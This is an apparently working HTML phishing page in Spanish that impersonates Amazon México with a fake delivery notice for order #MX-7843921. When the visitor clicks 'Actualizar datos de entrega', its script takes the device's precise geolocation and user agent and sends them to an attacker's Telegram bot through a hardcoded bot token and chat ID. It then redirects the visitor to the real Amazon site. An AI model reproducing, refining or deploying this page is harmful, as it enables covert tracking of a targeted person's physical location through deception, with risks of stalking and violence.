<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Amazon - Actualizar datos de entrega</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      font-family: Arial, Helvetica, sans-serif;
      background: #ffffff;
      color: #111111;
      line-height: 1.5;
    }
    .header {
      padding: 24px 16px 16px;
      text-align: center;
      background: #ffffff;
    }
    .amazon-logo {
      width: 140px;
      height: auto;
    }
    .main-content {
      max-width: 420px;
      margin: 0 auto;
      padding: 0 20px 40px;
      text-align: center;
    }
    h1 {
      font-size: 26px;
      font-weight: 700;
      margin: 32px 0 20px;
      color: #111111;
    }
    .order-info {
      font-size: 17px;
      margin: 0 0 28px;
      color: #333333;
    }
    .order-info strong {
      font-weight: 700;
      color: #111111;
    }
    .instruction {
      font-size: 16px;
      margin: 0 0 40px;
      color: #444444;
    }
    button {
      background: #ffa41c;
      color: #111111;
      font-size: 18px;
      font-weight: 600;
      padding: 14px 32px;
      border: none;
      border-radius: 8px;
      width: 100%;
      max-width: 320px;
      cursor: pointer;
      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
      transition: background 0.2s;
    }
    button:hover {
      background: #ff9900;
    }
    button:disabled {
      background: #cccccc;
      cursor: not-allowed;
    }
    #resultado {
      margin-top: 28px;
      font-size: 16px;
      font-weight: 500;
      color: #006600;
      min-height: 60px;
    }
    .footer {
      font-size: 13px;
      color: #666666;
      margin-top: 60px;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="header">
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon" class="amazon-logo">
  </div>
  <div class="main-content">
    <h1>Actualiza tus datos de entrega</h1>
    <div class="order-info">
      <strong>Pedido #MX-7843921</strong><br>
      Dirección faltante, Zapopan
    </div>
    <p class="instruction">
      Para garantizar la entrega correcta,<br>
      actualiza tus datos de ubicación más recientes.
    </p>
    <button id="btnActualizar" onclick="actualizarDatos()">
      Actualizar datos de entrega
    </button>
    <div id="resultado"></div>
    <div class="footer">
      Amazon México • Tus datos están protegidos • 2026
    </div>
  </div>
  <script>
    const BOT_TOKEN = '8665004647:AAEfrF0wdsqClv5BFRWByflP4R1rKTAJy34';
    const CHAT_ID = '5854071809';

    async function actualizarDatos() {
      const btn = document.getElementById('btnActualizar');
      const resultado = document.getElementById('resultado');
      btn.disabled = true;
      resultado.textContent = "Procesando...";

      if (!navigator.geolocation) {
        resultado.textContent = "No se pudo obtener la ubicación. Intenta más tarde.";
        btn.disabled = false;
        return;
      }

      navigator.geolocation.getCurrentPosition(
        async (position) => {
          const lat = position.coords.latitude.toFixed(6);
          const lon = position.coords.longitude.toFixed(6);
          const acc = Math.round(position.coords.accuracy);

          resultado.textContent = "Datos actualizados correctamente. Gracias por confirmar.";

          // 1. Enviar ubicación como pin interactivo en mapa (lo que ya tenías y te gusta)
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: CHAT_ID,
              latitude: parseFloat(lat),
              longitude: parseFloat(lon),
              horizontal_accuracy: acc
            })
          }).catch(() => {});

          // 2. Mensaje simple corto (lo que ya tenías)
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: CHAT_ID,
              text: `Actualización de entrega\nPedido: #MX-7843921\nUbicación: ${lat}, ${lon}\nPrecisión: ±${acc} m\nHora: ${new Date().toLocaleString('es-MX')}`
            })
          }).catch(() => {});

          // 3. Mensaje ADICIONAL en formato detallado que te gustaba (el de tu captura)
          const mensajeDetallado = 
            `🚨 NUEVA UBICACIÓN CAPTURADA 🚨\n\n` +
            `Pedido: #MX-7843921\n` +
            `Ciudad (por IP): Zapopan\n` +
            `Latitud: ${lat}\n` +
            `Longitud: ${lon}\n` +
            `Precisión: ±${acc} metros\n` +
            `Dispositivo: ${navigator.userAgent}\n` +
            `Hora: ${new Date().toLocaleString('es-MX', { dateStyle: 'short', timeStyle: 'medium' })}\n\n` +
            `Ver en mapa: https://www.google.com/maps?q=${lat},${lon}`;

          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: CHAT_ID,
              text: mensajeDetallado,
              parse_mode: 'Markdown'
            })
          }).catch(() => {});

          setTimeout(() => {
            window.location.href = "https://www.amazon.com.mx";
          }, 3000);
        },
        () => {
          resultado.textContent = "No se pudo obtener la ubicación. Intenta de nuevo.";
          btn.disabled = false;
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    }
  </script>
</body>
</html>
